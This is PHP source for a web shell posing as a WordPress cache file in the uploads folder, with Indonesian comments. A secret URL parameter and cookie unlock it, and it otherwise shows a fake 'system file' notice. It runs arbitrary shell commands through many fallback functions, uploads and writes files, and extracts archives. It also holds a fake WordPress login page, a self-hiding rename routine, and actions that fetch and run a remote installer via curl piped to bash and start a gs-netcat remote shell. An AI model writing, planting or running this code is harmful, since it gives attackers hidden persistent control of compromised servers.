<?php
// File: wp-content/uploads/wp-temp-cache.php
// Plugin Name: WordPress Temp Cache
// Description: Complete File Manager with All Features
// Version: 5.0 (Improved)

// Error handling yang lebih baik
if (!defined('STDIN')) define('STDIN', fopen('php://stdin', 'r'));
@ignore_user_abort(true);
@ini_set('zlib.output_compression', '0');
@ob_end_clean();

// ============================================================
// KONFIGURASI AWAL DENGAN ERROR HANDLING
// ============================================================
try {
    error_reporting(0);
    ini_set('display_errors', 0);
    ini_set('log_errors', 1);
    
    $session_name = 'wp_' . substr(md5(($_SERVER['HTTP_HOST'] ?? 'localhost') . __FILE__), 0, 10);
    session_name($session_name);
    
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    
    @set_time_limit(300);
    @ini_set('max_execution_time', 300);
    @ini_set('memory_limit', '256M');
    @ini_set('post_max_size', '100M');
    @ini_set('upload_max_filesize', '100M');
    
} catch (Exception $e) {
    // Silent fail
}
// ============================================================
// ============================================================
$valid_access = false;
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$secret_trigger = md5('wp_temp_cache_' . $host . '_' . __FILE__);
$cookie_name = 'wp_temp_' . substr(md5($host), 0, 8);

if (isset($_GET['boblee']) && $_GET['boblee'] == '1') {
    $valid_access = true;
    if (!headers_sent()) {
        setcookie($cookie_name, $secret_trigger, time() + 86400 * 30, '/');
    }
}

if (!$valid_access && isset($_COOKIE[$cookie_name]) && $_COOKIE[$cookie_name] === $secret_trigger) {
    $valid_access = true;
}

if (!$valid_access) {
    if (!headers_sent()) {
        header('Content-Type: text/plain');
        header('X-Robots-Tag: noindex, nofollow');
    }
    echo "# WordPress temporary cache file\n";
    echo "# Generated: " . date('Y-m-d H:i:s') . "\n";
    echo "# This is a system file, do not edit manually\n";
    echo "<?php exit; ?>\n";
    exit;
}
// ============================================================
// ============================================================

if (!function_exists('wtc_format_bytes')) {
    function wtc_format_bytes($bytes, $precision = 2) {
        if (!is_numeric($bytes) || $bytes <= 0) return '0 B';
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $base = log($bytes, 1024);
        $pow = floor($base);
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, $precision) . ' ' . $units[$pow];
    }
}

if (!function_exists('wtc_format_permissions')) {
    function wtc_format_permissions($path) {
        $default = ['unix' => '---------', 'octal' => '0000', 'writable' => false];
        if (!file_exists($path)) return $default;
        
        $perms = fileperms($path);
        if ($perms === false) return $default;
        
        $unix = (is_dir($path)) ? 'd' : '-';
        $unix .= ($perms & 0x0100) ? 'r' : '-';
        $unix .= ($perms & 0x0080) ? 'w' : '-';
        $unix .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
        $unix .= ($perms & 0x0020) ? 'r' : '-';
        $unix .= ($perms & 0x0010) ? 'w' : '-';
        $unix .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
        $unix .= ($perms & 0x0004) ? 'r' : '-';
        $unix .= ($perms & 0x0002) ? 'w' : '-';
        $unix .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
        
        $octal = substr(sprintf('%o', $perms), -4);
        $is_writable = is_writable($path);
        
        return ['unix' => $unix, 'octal' => $octal, 'writable' => $is_writable];
    }
}

function wtc_get_stable_current_dir() {
    static $stable_dir = null;
    if ($stable_dir === null) {
        $candidates = [];
        if (isset($_GET['__d__']) && is_string($_GET['__d__'])) {
            $candidates[] = $_GET['__d__'];
        }
        
        $cwd = @getcwd();
        if ($cwd !== false) $candidates[] = $cwd;
        
        $candidates[] = dirname(__FILE__);
        
        $realpath = @realpath('.');
        if ($realpath !== false) $candidates[] = $realpath;
        
        foreach ($candidates as $candidate) {
            if ($candidate && @is_dir($candidate) && @is_readable($candidate)) {
                $stable_dir = $candidate;
                break;
            }
        }
        if (!$stable_dir) $stable_dir = '.';
    }
    return $stable_dir;
}

function wtc_is_self_hidden($filename) {
    return strpos(basename($filename), '.') === 0;
}

function wtc_hide_self($filename) {
    $hidden = '.' . basename($filename);
    $hidden_path = dirname($filename) . '/' . $hidden;
    if (@rename($filename, $hidden_path)) {
        return $hidden_path;
    }
    return $filename;
}

// ============================================================
// ============================================================

function wtc_enhanced_upload($tmp_name, $target, $filename) {
    $methods_tried = [];
    $result = ['success' => false, 'method' => '', 'methods_tried' => []];
    
    if (empty($tmp_name) || !file_exists($tmp_name)) {
        $result['methods_tried'] = ['invalid_file'];
        return $result;
    }
    
    if (is_uploaded_file($tmp_name)) {
        if (@move_uploaded_file($tmp_name, $target)) {
            @chmod($target, 0644);
            $result['success'] = true;
            $result['method'] = 'move_uploaded_file';
            return $result;
        }
        $methods_tried[] = 'move_uploaded_file';
    }
    
    if (@copy($tmp_name, $target)) {
        @chmod($target, 0644);
        @unlink($tmp_name);
        $result['success'] = true;
        $result['method'] = 'copy';
        return $result;
    }
    $methods_tried[] = 'copy';
    
    $content = @file_get_contents($tmp_name);
    if ($content !== false && @file_put_contents($target, $content) !== false) {
        @chmod($target, 0644);
        $result['success'] = true;
        $result['method'] = 'file_put_contents';
        return $result;
    }
    $methods_tried[] = 'file_put_contents';
    
    $source = @fopen($tmp_name, 'rb');
    $dest = @fopen($target, 'wb');
    if ($source && $dest) {
        $success = true;
        while (!feof($source)) {
            $chunk = @fread($source, 8192);
            if ($chunk === false || @fwrite($dest, $chunk) === false) {
                $success = false;
                break;
            }
        }
        @fclose($source); 
        @fclose($dest);
        if ($success) {
            @chmod($target, 0644);
            $result['success'] = true;
            $result['method'] = 'fopen_fwrite';
            return $result;
        }
    }
    $methods_tried[] = 'fopen_fwrite';
    
    $source = @fopen($tmp_name, 'rb');
    $dest = @fopen($target, 'wb');
    if ($source && $dest) {
        if (@stream_copy_to_stream($source, $dest) !== false) {
            @fclose($source); 
            @fclose($dest);
            @chmod($target, 0644);
            $result['success'] = true;
            $result['method'] = 'stream_copy';
            return $result;
        }
    }
    $methods_tried[] = 'stream_copy';
    
    ob_start();
    @readfile($tmp_name);
    $content = ob_get_clean();
    if (!empty($content) && @file_put_contents($target, $content) !== false) {
        @chmod($target, 0644);
        $result['success'] = true;
        $result['method'] = 'readfile';
        return $result;
    }
    $methods_tried[] = 'readfile';
    
    if (function_exists('shell_exec') && !ini_get('safe_mode')) {
        $tmp_dir = dirname($tmp_name);
        $target_dir = dirname($target);
        $file = basename($target);
        @shell_exec('cp ' . escapeshellarg($tmp_name) . ' ' . escapeshellarg($target) . ' 2>&1');
        if (file_exists($target) && filesize($target) > 0) {
            @chmod($target, 0644);
            $result['success'] = true;
            $result['method'] = 'shell_cp';
            return $result;
        }
    }
    $methods_tried[] = 'shell_cp';
    
    $result['methods_tried'] = $methods_tried;
    return $result;
}

// ============================================================
// ============================================================

function wtc_enhanced_create($path, $type, $content = '') {
    $result = ['success' => false, 'method' => ''];
    
    if ($type === 'folder') {
        if (@mkdir($path, 0755, true)) {
            $result['success'] = true;
            $result['method'] = 'mkdir';
            return $result;
        }
        if (@mkdir($path, 0777, true)) {
            $result['success'] = true;
            $result['method'] = 'mkdir_wide';
            return $result;
        }
        if (function_exists('shell_exec') && !ini_get('safe_mode')) {
            @shell_exec('mkdir -p ' . escapeshellarg($path) . ' 2>&1');
            if (@is_dir($path)) {
                $result['success'] = true;
                $result['method'] = 'shell_mkdir';
                return $result;
            }
        }
        $parent = dirname($path);
        if (!is_dir($parent)) {
            wtc_enhanced_create($parent, 'folder', '');
            return wtc_enhanced_create($path, $type, $content);
        }
    } else {
        if (@file_put_contents($path, $content) !== false) {
            @chmod($path, 0644);
            $result['success'] = true;
            $result['method'] = 'file_put_contents';
            return $result;
        }
        $fp = @fopen($path, 'w');
        if ($fp) {
            if (@fwrite($fp, $content) !== false) {
                @fclose($fp);
                @chmod($path, 0644);
                $result['success'] = true;
                $result['method'] = 'fopen_fwrite';
                return $result;
            }
            @fclose($fp);
        }
        if (@touch($path) && @file_put_contents($path, $content) !== false) {
            @chmod($path, 0644);
            $result['success'] = true;
            $result['method'] = 'touch_write';
            return $result;
        }
        if (function_exists('shell_exec') && !ini_get('safe_mode')) {
            $escaped = addslashes($content);
            @shell_exec('echo "' . $escaped . '" > ' . escapeshellarg($path) . ' 2>&1');
            if (file_exists($path)) {
                $result['success'] = true;
                $result['method'] = 'shell_echo';
                return $result;
            }
        }
    }
    return $result;
}

// ============================================================
// ============================================================

function wtc_enhanced_write_file($path, $content) {
    $result = ['success' => false, 'method' => ''];
    
    if (@file_put_contents($path, $content) !== false) {
        $result['success'] = true;
        $result['method'] = 'file_put_contents';
        return $result;
    }
    
    $fp = @fopen($path, 'w');
    if ($fp) {
        if (@fwrite($fp, $content) !== false) {
            @fclose($fp);
            $result['success'] = true;
            $result['method'] = 'fopen_fwrite';
            return $result;
        }
        @fclose($fp);
    }
    
    if (@file_put_contents($path, $content, LOCK_EX) !== false) {
        $result['success'] = true;
        $result['method'] = 'file_put_contents_lock';
        return $result;
    }
    
    if (function_exists('shell_exec') && !ini_get('safe_mode')) {
        $escaped = addslashes($content);
        @shell_exec('echo "' . $escaped . '" > ' . escapeshellarg($path) . ' 2>&1');
        if (file_exists($path)) {
            $result['success'] = true;
            $result['method'] = 'shell_echo';
            return $result;
        }
    }
    
    $fp = @fopen($path, 'w');
    if ($fp) {
        $written = @fwrite($fp, $content);
        @fclose($fp);
        if ($written !== false) {
            $result['success'] = true;
            $result['method'] = 'fwrite_final';
            return $result;
        }
    }
    
    return $result;
}

// ============================================================
// ============================================================

function wtc_enhanced_mkdir($path, $perms = 0755) {
    if (@is_dir($path)) return true;
    if (@mkdir($path, $perms, true)) return true;
    if (@mkdir($path, 0777, true)) return true;
    
    $parent = dirname($path);
    if (!@is_dir($parent)) {
        if (wtc_enhanced_mkdir($parent, $perms)) {
            if (@mkdir($path, $perms)) return true;
        }
    }
    
    if (function_exists('shell_exec') && !ini_get('safe_mode')) {
        @shell_exec('mkdir -p ' . escapeshellarg($path) . ' 2>&1');
        if (@is_dir($path)) return true;
    }
    
    $old = umask(0);
    $result = @mkdir($path, $perms);
    umask($old);
    if ($result) return true;
    
    return false;
}

// ============================================================
// ============================================================

function wtc_execute_local($cmd, $cwd = null) {
    if (empty($cmd) || !is_string($cmd)) {
        return "❌ Invalid command";
    }
    
    $target_dir = $cwd ?: wtc_get_stable_current_dir();
    $full_cmd = 'cd "' . addslashes($target_dir) . '" && ' . $cmd . ' 2>&1';
    $result = '';
    
    if (function_exists('shell_exec') && !ini_get('safe_mode')) {
        $result = @shell_exec($full_cmd);
        if ($result !== null && $result !== false && trim($result) !== '') {
            return "✅ Success: " . $cmd . "\n" . $result;
        }
    }
    
    if (function_exists('exec')) {
        @exec($full_cmd, $output, $return_var);
        if (!empty($output)) {
            $result = implode("\n", $output);
            if ($return_var === 0 && trim($result) !== '') {
                return "✅ Success: " . $cmd . "\n" . $result;
            }
        }
    }
    
    if (function_exists('passthru')) {
        ob_start();
        @passthru($full_cmd, $return_var);
        $result = ob_get_clean();
        if ($return_var === 0 && !empty($result)) {
            return "✅ Success: " . $cmd . "\n" . $result;
        }
    }
    
    if (function_exists('system')) {
        ob_start();
        @system($full_cmd, $return_var);
        $result = ob_get_clean();
        if ($return_var === 0 && !empty($result)) {
            return "✅ Success: " . $cmd . "\n" . $result;
        }
    }
    
    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = @proc_open($full_cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            @fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            @fclose($pipes[1]); 
            @fclose($pipes[2]);
            $return_value = proc_close($process);
            $result = trim($stdout) . (!empty($stderr) ? "\n[STDERR]: " . trim($stderr) : '');
            if ($return_value === 0 && !empty($result)) {
                return "✅ Success: " . $cmd . "\n" . $result;
            }
        }
    }
    
    if (function_exists('popen')) {
        $handle = @popen($full_cmd, 'r');
        if (is_resource($handle)) {
            $result = '';
            while (!feof($handle)) {
                $result .= fread($handle, 8192);
            }
            pclose($handle);
            if (!empty(trim($result))) {
                return "✅ Success: " . $cmd . "\n" . $result;
            }
        }
    }
    
    if (preg_match('/^ls\s*(.+)?$/i', $cmd, $matches)) {
        $path = isset($matches[1]) ? trim($matches[1]) : '.';
        $full_path = $target_dir . '/' . ltrim($path, '/');
        if (is_dir($full_path)) {
            $files = @scandir($full_path);
            if ($files !== false) {
                $result = implode("\n", array_diff($files, ['.', '..']));
                if (!empty($result)) {
                    return "✅ Success: " . $cmd . "\n" . $result;
                }
            }
        }
    }
    
    if (preg_match('/^pwd$/i', $cmd)) {
        return "✅ Success: " . $cmd . "\n" . $target_dir;
    }
    
    if (preg_match('/^php\s+-v$/i', $cmd)) {
        return "✅ Success: " . $cmd . "\nPHP Version: " . phpversion();
    }
    
    return !empty($result) ? "❌ Failed: " . $cmd . "\n" . $result : "❌ No execution method available";
}

// ============================================================
// ============================================================

function wtc_enhanced_download($cmd, $path) {
    $result = ['success' => false, 'output' => '', 'method' => ''];
    
    if (empty($cmd) || !is_string($cmd)) {
        $result['output'] = "❌ Invalid command";
        return $result;
    }
    
    if (preg_match('/^wget\s+(?:-O\s+(\S+)\s+)?(https?:\/\/\S+)/i', $cmd, $matches)) {
        $url = isset($matches[2]) ? $matches[2] : $matches[1];
        $filename = (isset($matches[1]) && $matches[1] != $url) ? $matches[1] : basename(parse_url($url, PHP_URL_PATH));
        if (empty($filename)) {
            $filename = 'downloaded_' . time() . '.bin';
        }
        $target_path = rtrim($path, '/') . '/' . $filename;
        
        if (function_exists('shell_exec') && !ini_get('safe_mode')) {
            $full_cmd = 'cd "' . addslashes($path) . '" && wget ' . escapeshellarg($url) . ' -O ' . escapeshellarg($filename) . ' 2>&1';
            $output = @shell_exec($full_cmd);
            if (file_exists($target_path) && filesize($target_path) > 0) {
                $result['success'] = true;
                $result['output'] = "✅ Download berhasil: $filename (" . wtc_format_bytes(filesize($target_path)) . ")\n" . $output;
                $result['method'] = 'shell_exec_wget';
                return $result;
            }
        }
        
        $download_result = wtc_download_with_php($url, $target_path);
        if ($download_result) {
            $result['success'] = true;
            $result['output'] = $download_result;
            $result['method'] = 'php_download';
            return $result;
        }
    }
    
    if (preg_match('/^curl\s+(?:-o\s+(\S+)\s+)?(https?:\/\/\S+)/i', $cmd, $matches)) {
        $url = isset($matches[2]) ? $matches[2] : $matches[1];
        $filename = (isset($matches[1]) && $matches[1] != $url) ? $matches[1] : basename(parse_url($url, PHP_URL_PATH));
        if (empty($filename)) {
            $filename = 'downloaded_' . time() . '.bin';
        }
        $target_path = rtrim($path, '/') . '/' . $filename;
        
        if (function_exists('shell_exec') && !ini_get('safe_mode')) {
            $full_cmd = 'cd "' . addslashes($path) . '" && curl -o ' . escapeshellarg($filename) . ' ' . escapeshellarg($url) . ' 2>&1';
            $output = @shell_exec($full_cmd);
            if (file_exists($target_path) && filesize($target_path) > 0) {
                $result['success'] = true;
                $result['output'] = "✅ Download berhasil: $filename (" . wtc_format_bytes(filesize($target_path)) . ")\n" . $output;
                $result['method'] = 'shell_exec_curl';
                return $result;
            }
        }
        
        $download_result = wtc_download_with_php($url, $target_path);
        if ($download_result) {
            $result['success'] = true;
            $result['output'] = $download_result;
            $result['method'] = 'php_download';
            return $result;
        }
    }
    
    return $result;
}

function wtc_download_with_php($url, $target_path) {
    $content = false;
    $methods_used = [];
    
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }
    
    $context_options = [
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        'http' => [
            'method' => 'GET',
            'timeout' => 60,
            'header' => implode("\r\n", [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept: */*",
                "Accept-Language: en-US,en;q=0.9"
            ]),
            'follow_location' => 1,
            'max_redirects' => 5
        ]
    ];
    $context = stream_context_create($context_options);
    $content = @file_get_contents($url, false, $context);
    if ($content !== false) {
        $methods_used[] = 'file_get_contents';
    }
    
    // Method 2: curl
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 60,
            CURLOPT_USERAGENT => 'Mozilla/5.0'
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        if ($content !== false) {
            $methods_used[] = 'curl';
        }
    }
    
    if ($content === false) {
        $handle = @fopen($url, 'rb', false, $context);
        if ($handle) {
            $content = '';
            while (!feof($handle)) {
                $content .= fread($handle, 8192);
            }
            fclose($handle);
            if (!empty($content)) {
                $methods_used[] = 'fopen';
            }
        }
    }
    
    if (!empty($content)) {
        $dir = dirname($target_path);
        if (!is_dir($dir)) {
            wtc_enhanced_mkdir($dir);
        }
        
        $write_result = wtc_enhanced_write_file($target_path, $content);
        if ($write_result['success']) {
            $size = file_exists($target_path) ? filesize($target_path) : 0;
            $methods_str = implode(', ', $methods_used);
            return "✅ Download via PHP ($methods_str) & write via {$write_result['method']}: " . basename($target_path) . " (" . wtc_format_bytes($size) . ")";
        }
    }
    
    return false;
}

// ============================================================
// ============================================================

function show_fake_login() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>WordPress &rsaquo; Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f0f1; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
            #login { width: 320px; padding: 8% 0 0; }
            .login form { background: #fff; border: 1px solid #c3c4c7; padding: 26px 24px; }
            .login form .input { font-size: 24px; width: 100%; padding: 3px; margin: 2px 6px 16px 0; background: #f6f7f7; border: 1px solid #dcdcde; }
            .login form input[type=submit] { background: #2271b1; border-color: #2271b1; color: #fff; padding: 10px 20px; border: 1px solid; border-radius: 3px; cursor: pointer; width: 100%; }
            .login h1 a { background-image: url(data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M12%202C6.48%202%202%206.48%202%2012s4.48%2010%2010%2010%2010-4.48%2010-10S17.52%202%2012%202zm0%203c3.31%200%206%202.69%206%206%200%202.22-1.21%204.15-3%205.19V7h-2v9.19c-1.79-1.04-3-2.97-3-5.19%200-3.31%202.69-6%206-6z%22%20fill%3D%22%232271b1%22%2F%3E%3C%2Fsvg%3E); background-size: 84px; height: 84px; width: 84px; display: block; margin: 0 auto 25px; text-indent: -9999px; }
        </style>
    </head>
    <body>
        <div id="login">
            <h1><a href="#">WordPress</a></h1>
            <form method="post">
                <p>
                    <label>Username<br>
                    <input type="text" name="log" class="input" value="admin" readonly></label>
                </p>
                <p>
                    <label>Password<br>
                    <input type="password" name="__p__" class="input" value="" autofocus></label>
                </p>
                <p class="submit">
                    <input type="submit" value="Log In">
                </p>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================
// ============================================================

if (!isset($_SESSION['initial_dir'])) {
    $_SESSION['initial_dir'] = wtc_get_stable_current_dir();
}
$home_path = $_SESSION['initial_dir'];

$__dir__ = isset($_GET['__d__']) && is_string($_GET['__d__']) ? $_GET['__d__'] : wtc_get_stable_current_dir();
if (!@is_dir($__dir__)) $__dir__ = wtc_get_stable_current_dir();
if ($__dir__ !== '/' && substr($__dir__, -1) !== '/') $__dir__ .= '/';

$messages = [];
$cmd_output = isset($_SESSION['cmd_output']) ? $_SESSION['cmd_output'] : '';
$editing_file = null;
$file_content = '';

if (isset($_SESSION['upload_message'])) {
    $messages[] = $_SESSION['upload_message'];
    unset($_SESSION['upload_message']);
}

if (isset($_GET['__edit__']) && is_string($_GET['__edit__'])) {
    $edit_file = basename($_GET['__edit__']);
    $edit_path = $__dir__ . $edit_file;
    if (file_exists($edit_path) && is_file($edit_path) && is_readable($edit_path)) {
        $editing_file = $edit_file;
        $file_content = file_get_contents($edit_path);
    }
}

// ============================================================
// ============================================================

if (isset($_POST['ajax']) && $_POST['ajax'] == 1) {
    if (!headers_sent()) {
        header('Content-Type: application/json');
    }
    
    $cmd = isset($_POST['cmd']) && is_string($_POST['cmd']) ? $_POST['cmd'] : '';
    $path = isset($_POST['path']) && is_string($_POST['path']) ? $_POST['path'] : $__dir__;
    
    if (empty($cmd)) {
        echo json_encode(['error' => 'Tidak ada perintah']);
        exit;
    }
    
    $output = '';
    $method = 'none';
    
    if (preg_match('/^(wget|curl)\s+/i', $cmd)) {
        $enhanced_output = wtc_enhanced_download($cmd, $path);
        if ($enhanced_output['success']) {
            $output = $enhanced_output['output'];
            $method = $enhanced_output['method'];
        }
    }
    
    if (empty($output)) {
        $output = wtc_execute_local($cmd, $path);
        if (!empty($output) && strpos($output, '❌ No execution method') === false) {
            $method = 'executeLocal';
        }
    }
    
    echo json_encode([
        'status' => (!empty($output) && strpos($output, '❌') === false) ? '✅ SUCCESS' : '❌ FAILED',
        'method' => $method,
        'output' => !empty($output) ? $output : 'Tidak ada output',
        'command' => $cmd,
        'path' => $path,
        'timestamp' => date('Y-m-d H:i:s')
    ]);
    exit;
}

// ============================================================
// ============================================================

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // ===== MULTIPLE FILE UPLOAD =====
    if (!empty($_FILES['files'])) {
        $success_uploads = [];
        $failed_uploads = [];
        $methods_used = [];
        
        if (is_array($_FILES['files']['name'])) {
            $total_files = count($_FILES['files']['name']);
            
            for ($i = 0; $i < $total_files; $i++) {
                if (isset($_FILES['files']['error'][$i]) && $_FILES['files']['error'][$i] === UPLOAD_ERR_OK && 
                    !empty($_FILES['files']['tmp_name'][$i])) {
                    $filename = basename($_FILES['files']['name'][$i]);
                    $target = $__dir__ . $filename;
                    $upload_result = wtc_enhanced_upload($_FILES['files']['tmp_name'][$i], $target, $filename);
                    
                    if ($upload_result['success']) {
                        $success_uploads[] = $filename . " (" . $upload_result['method'] . ")";
                        $methods_used[] = $upload_result['method'];
                    } else {
                        $failed_uploads[] = $filename;
                    }
                } else {
                    $error_msg = isset($_FILES['files']['name'][$i]) ? $_FILES['files']['name'][$i] : 'Unknown file';
                    $error_code = isset($_FILES['files']['error'][$i]) ? $_FILES['files']['error'][$i] : 'unknown';
                    $failed_uploads[] = $error_msg . " (error code: " . $error_code . ")";
                }
            }
        }
        
        $message = "";
        if (!empty($success_uploads)) {
            $unique_methods = array_unique($methods_used);
            $message .= "✅ Berhasil upload: " . implode(', ', $success_uploads) . " (metode: " . implode(', ', $unique_methods) . ")";
        }
        if (!empty($failed_uploads)) {
            $message .= (!empty($message) ? "\n" : "") . "❌ Gagal: " . implode(', ', $failed_uploads);
        }
        
        $_SESSION['upload_message'] = $message;
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    // ===== GSOCKET ACTIONS =====
    if (isset($_POST['gsocket_action']) && is_string($_POST['gsocket_action'])) {
        $action = $_POST['gsocket_action'];
        $output = "";
        
        if ($action == 'install') {
            $output .= "📦 INSTALL GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            $result = wtc_execute_local('bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1', $__dir__);
            $output .= $result . "\n\n";
            $check = wtc_execute_local('which gs-netcat 2>&1', $__dir__);
            $output .= strpos($check, 'gs-netcat') !== false ? "✅ GSOCKET BERHASIL TERINSTALL!\n" : "❌ INSTALL GAGAL.\n";
        } elseif ($action == 'uninstall') {
            $output .= "🗑️ UNINSTALL GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            $result = wtc_execute_local('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1', $__dir__);
            $output .= $result . "\n\n";
            $output .= "✅ GSOCKET TELAH DIUNINSTALL!\n";
        } elseif ($action == 'run') {
            $secret = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 16);
            $output .= "🚀 RUN GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            $output .= "🔑 SECRET: $secret\n";
            $output .= "📋 COPY SECRET INI: $secret\n\n";
            $output .= "💻 Perintah konek: gs-netcat -s \"$secret\" -i\n";
            wtc_execute_local('pkill -f gs-netcat 2>&1', $__dir__);
            wtc_execute_local('nohup gs-netcat -s "' . $secret . '" -i > /dev/null 2>&1 &', $__dir__);
            $output .= "✅ GSOCKET BERJALAN DI BACKGROUND!\n";
        } elseif ($action == 'kill') {
            $output .= "🔪 KILL GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            wtc_execute_local('pkill -f gs-netcat 2>&1', $__dir__);
            $output .= "✅ SEMUA PROSES GSOCKET TELAH DIMATIKAN!\n";
        }
        
        $_SESSION['cmd_output'] = $output;
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    if (isset($_FILES['zip_file'])) {
        if ($_FILES['zip_file']['error'] !== UPLOAD_ERR_OK) {
            $error_msg = match($_FILES['zip_file']['error']) {
                UPLOAD_ERR_INI_SIZE => "file terlalu besar (max " . ini_get('upload_max_filesize') . ")",
                UPLOAD_ERR_FORM_SIZE => "file terlalu besar",
                UPLOAD_ERR_PARTIAL => "upload tidak lengkap",
                UPLOAD_ERR_NO_FILE => "tidak ada file",
                UPLOAD_ERR_NO_TMP_DIR => "folder temporary tidak ada",
                UPLOAD_ERR_CANT_WRITE => "gagal menulis file",
                default => "error code: " . $_FILES['zip_file']['error']
            };
            $_SESSION['upload_message'] = "❌ Upload ZIP gagal: $error_msg";
        } else {
            $zip_name = basename($_FILES['zip_file']['name']);
            $zip_target = $__dir__ . $zip_name;
            
            // Validasi file ZIP
            $is_zip = false;
            if (function_exists('finfo_open')) {
                $finfo = @finfo_open(FILEINFO_MIME_TYPE);
                if ($finfo) {
                    $mime_type = @finfo_file($finfo, $_FILES['zip_file']['tmp_name']);
                    @finfo_close($finfo);
                    $valid_mime = ['application/zip', 'application/x-zip', 'application/x-zip-compressed'];
                    $is_zip = in_array($mime_type, $valid_mime);
                }
            }
            if (!$is_zip) {
                $handle = @fopen($_FILES['zip_file']['tmp_name'], 'rb');
                if ($handle) {
                    $bytes = @fread($handle, 4);
                    @fclose($handle);
                    $is_zip = ($bytes === "PK\x03\x04");
                }
            }
            
            if (!$is_zip) {
                $_SESSION['upload_message'] = "❌ File bukan ZIP yang valid!";
            } else {
                $upload_result = wtc_enhanced_upload($_FILES['zip_file']['tmp_name'], $zip_target, $zip_name);
                
                if ($upload_result['success']) {
                    $message = "✅ ZIP berhasil diupload: $zip_name (" . $upload_result['method'] . ")";
                    
                    $extract_success = false;
                    
                    if (class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($zip_target) === TRUE) {
                            if ($zip->extractTo($__dir__)) {
                                $zip->close();
                                $extract_success = true;
                                $message .= " dan diekstrak! (ZipArchive)";
                            } else {
                                $zip->close();
                            }
                        }
                    }
                    
                    if (!$extract_success && function_exists('shell_exec') && !ini_get('safe_mode')) {
                        $unzip_cmd = 'cd "' . addslashes($__dir__) . '" && unzip -o ' . escapeshellarg($zip_name) . ' 2>&1';
                        $output = @shell_exec($unzip_cmd);
                        if (strpos($output, 'inflating:') !== false || strpos($output, 'extracting:') !== false) {
                            $extract_success = true;
                            $message .= " dan diekstrak! (shell_unzip)";
                        }
                    }
                    
                    if (!$extract_success && class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($zip_target) === TRUE) {
                            $zip->extractTo($__dir__);
                            $zip->close();
                            $extract_success = true;
                            $message .= " dan diekstrak! (ZipArchive retry)";
                        }
                    }
                    
                    if (!$extract_success) {
                        $message .= " (upload berhasil, ekstrak manual via tombol Extract)";
                    }
                    
                    $_SESSION['upload_message'] = $message;
                } else {
                    $methods = isset($upload_result['methods_tried']) ? implode(',', $upload_result['methods_tried']) : 'unknown';
                    $_SESSION['upload_message'] = "❌ Gagal upload ZIP (metode: " . $methods . ")";
                }
            }
        }
        
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
    if (isset($_POST['__create__'])) {
        if (isset($_POST['__name__']) && is_string($_POST['__name__']) && !empty($_POST['__name__'])) {
            $name = basename($_POST['__name__']);
            $type = isset($_POST['__type__']) && $_POST['__type__'] === 'folder' ? 'folder' : 'file';
            $path = $__dir__ . $name;
            
            $content = isset($_POST['__data__']) && is_string($_POST['__data__']) ? $_POST['__data__'] : '';
            $create_result = wtc_enhanced_create($path, $type, $content);
            
            if ($create_result['success']) {
                $_SESSION['upload_message'] = "✅ Berhasil membuat {$type}: $name (metode: {$create_result['method']})";
            } else {
                $_SESSION['upload_message'] = "❌ Gagal membuat {$type}: $name";
            }
        } else {
            $_SESSION['upload_message'] = "❌ Nama tidak boleh kosong";
        }
        
        $redirect_url = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $redirect_url);
        exit;
    }
    
